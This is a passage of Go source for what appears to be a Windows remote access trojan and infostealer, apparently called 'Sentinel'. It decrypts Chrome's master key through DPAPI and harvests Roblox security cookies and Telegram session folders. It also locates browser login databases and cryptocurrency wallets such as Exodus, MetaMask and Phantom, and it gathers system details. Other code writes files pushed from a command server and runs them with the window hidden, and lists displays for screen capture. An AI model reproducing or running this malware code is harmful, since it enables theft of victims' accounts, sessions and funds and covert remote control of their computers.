func decryptDPAPI(data []byte) ([]byte, error) {
	defer func() { recover() }()

	var outBlob windows.DataBlob
	inBlob := windows.DataBlob{
		Size: uint32(len(data)),
		Data: &data[0],
	}

	err := windows.CryptUnprotectData(&inBlob, nil, nil, 0, nil, 0, &outBlob)
	if err != nil {
		return nil, err
	}

	result := make([]byte, outBlob.Size)
	copy(result, unsafe.Slice(outBlob.Data, outBlob.Size))
	windows.LocalFree(windows.Handle(unsafe.Pointer(outBlob.Data)))

	return result, nil
}

func getRobloxCookies() []map[string]string {
	var cookies []map[string]string

	key, err := registry.OpenKey(registry.CURRENT_USER,
		`SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com`,
		registry.QUERY_VALUE)
	if err == nil {
		defer key.Close()
		cookie, _, err := key.GetStringValue(".ROBLOSECURITY")
		if err == nil && cookie != "" {
			cookies = append(cookies, map[string]string{
				"cookie": cookie,
				"source": "registry",
			})
		}
	}

	return cookies
}

func getTelegramSessions() []map[string]string {
	var sessions []map[string]string

	appdata := os.Getenv("APPDATA")
	tgPath := filepath.Join(appdata, "Telegram Desktop", "tdata")

	if _, err := os.Stat(tgPath); err == nil {
		sessions = append(sessions, map[string]string{
			"path":   tgPath,
			"exists": "true",
		})
	}

	return sessions
}

func getBrowserData() []map[string]string {
	var data []map[string]string

	localAppdata := os.Getenv("LOCALAPPDATA")

	browsers := map[string]string{
		"Chrome":  filepath.Join(localAppdata, "Google", "Chrome", "User Data"),
		"Edge":    filepath.Join(localAppdata, "Microsoft", "Edge", "User Data"),
		"Brave":   filepath.Join(localAppdata, "BraveSoftware", "Brave-Browser", "User Data"),
		"Opera":   filepath.Join(localAppdata, "Opera Software", "Opera Stable"),
		"Vivaldi": filepath.Join(localAppdata, "Vivaldi", "User Data"),
	}

	for name, path := range browsers {
		if _, err := os.Stat(path); err == nil {
			localStatePath := filepath.Join(path, "Local State")
			masterKey := getMasterKey(localStatePath)

			info := map[string]string{
				"browser": name,
				"path":    path,
			}

			if masterKey != nil {
				info["has_key"] = "true"
				loginPath := filepath.Join(path, "Default", "Login Data")
				if _, err := os.Stat(loginPath); err == nil {
					info["has_logins"] = "true"
				}
			}

			data = append(data, info)
		}
	}

	return data
}

func getMasterKey(localStatePath string) []byte {
	defer func() { recover() }()

	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil
	}

	var state map[string]interface{}
	if err := json.Unmarshal(data, &state); err != nil {
		return nil
	}

	osC, ok := state["os_crypt"].(map[string]interface{})
	if !ok {
		return nil
	}

	encKey, ok := osC["encrypted_key"].(string)
	if !ok {
		return nil
	}

	keyBytes, _ := base64.StdEncoding.DecodeString(encKey)
	if len(keyBytes) < 6 {
		return nil
	}
	keyBytes = keyBytes[5:]

	masterKey, _ := decryptDPAPI(keyBytes)
	return masterKey
}

func getCryptoWallets() []map[string]string {
	var wallets []map[string]string

	appdata := os.Getenv("APPDATA")
	localAppdata := os.Getenv("LOCALAPPDATA")

	walletPaths := map[string]string{
		"Exodus":   filepath.Join(appdata, "Exodus", "exodus.wallet"),
		"Atomic":   filepath.Join(appdata, "atomic", "Local Storage", "leveldb"),
		"Electrum": filepath.Join(appdata, "Electrum", "wallets"),
		"Coinomi":  filepath.Join(localAppdata, "Coinomi", "Coinomi", "wallets"),
		"Guarda":   filepath.Join(appdata, "Guarda", "Local Storage", "leveldb"),
		"Wasabi":   filepath.Join(appdata, "WalletWasabi", "Client", "Wallets"),
		"Metamask": filepath.Join(localAppdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
		"Phantom":  filepath.Join(localAppdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
	}

	for name, path := range walletPaths {
		if _, err := os.Stat(path); err == nil {
			wallets = append(wallets, map[string]string{
				"name": name,
				"path": path,
			})
		}
	}

	return wallets
}

func getSystemInfo() map[string]string {
	return map[string]string{
		"hostname":   getHostname(),
		"username":   os.Getenv("USERNAME"),
		"os":         runtime.GOOS,
		"arch":       runtime.GOARCH,
		"processors": fmt.Sprintf("%d", runtime.NumCPU()),
		"os_version": getWindowsVersion(),
	}
}

// === FILE HANDLING (Legacy - for uploaded files) ===

func handleFileUpload(fileName, fileData string) {
	defer func() {
		if r := recover(); r != nil {
			sendFileResponse("file_upload_error", fileName, fmt.Sprintf("Panic: %v", r))
		}
	}()

	data, err := base64.StdEncoding.DecodeString(fileData)
	if err != nil {
		sendFileResponse("file_upload_error", fileName, err.Error())
		return
	}

	tempDir := os.TempDir()
	filePath := filepath.Join(tempDir, fileName)

	err = os.WriteFile(filePath, data, 0755)
	if err != nil {
		sendFileResponse("file_upload_error", fileName, err.Error())
		return
	}

	sendFileResponse("file_uploaded", fileName, filePath)
}

func handleFileExecute(fileName string) {
	defer func() {
		if r := recover(); r != nil {
			sendFileResponse("file_execute_error", fileName, fmt.Sprintf("Panic: %v", r))
		}
	}()

	tempDir := os.TempDir()
	filePath := filepath.Join(tempDir, fileName)

	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		sendFileResponse("file_execute_error", fileName, "File not found")
		return
	}

	cmd := exec.Command(filePath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Start()

	if err != nil {
		sendFileResponse("file_execute_error", fileName, err.Error())
		return
	}

	sendFileResponse("file_executed", fileName, "Started with PID: "+fmt.Sprintf("%d", cmd.Process.Pid))
}

func sendFileResponse(msgType, fileName, message string) {
	safeWriteJSON(map[string]interface{}{
		"type": msgType,
		"data": map[string]string{
			"fileName": fileName,
			"message":  message,
		},
	})
}

// === MONITORS ===

func handleMonitorsList() {
	defer func() {
		if r := recover(); r != nil {
			sendError("monitors_error", fmt.Sprintf("Panic: %v", r))
		}
	}()

	n := screenshot.NumActiveDisplays()
	if n == 0 {
		safeWriteJSON(map[string]interface{}{
			"type": "monitors_list_response",
			"data": map[string]interface{}{
				"monitors": []map[string]interface{}{
					{"id": "0", "name": "Монитор 1", "width": 1920, "height": 1080, "isPrimary": true},
				},
			},
		})
		return
	}

	var monitors []map[string]interface{}
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		monitors = append(monitors, map[string]interface{}{
			"id":        fmt.Sprintf("%d", i),
			"name":      fmt.Sprintf("Монитор %d", i+1),
			"width":     bounds.Dx(),
			"height":    bounds.Dy(),
			"isPrimary": i == 0,
		})
	}

	safeWriteJSON(map[string]interface{}{
		"type": "monitors_list_response",
		"data": map[string]interface{}{
			"monitors": monitors,
		},
	})
}

// === HELPERS ===

func getHostname() string {
	name, _ := os.Hostname()
	return name
}

func getLocalIP() string {
	addrs, _ := net.InterfaceAddrs()
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "unknown"
}

func getWindowsVersion() string {
	defer func() { recover() }()
	cmd := exec.Command("cmd", "/c", "ver")
	output, err := cmd.Output()
	if err != nil {
		return "Windows"
	}
	return strings.TrimSpace(string(output))
}

func init() {
	if strings.Contains(ServerURL, "{{") {
		fmt.Println("ERROR: Client not properly built")
		os.Exit(1)
	}
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
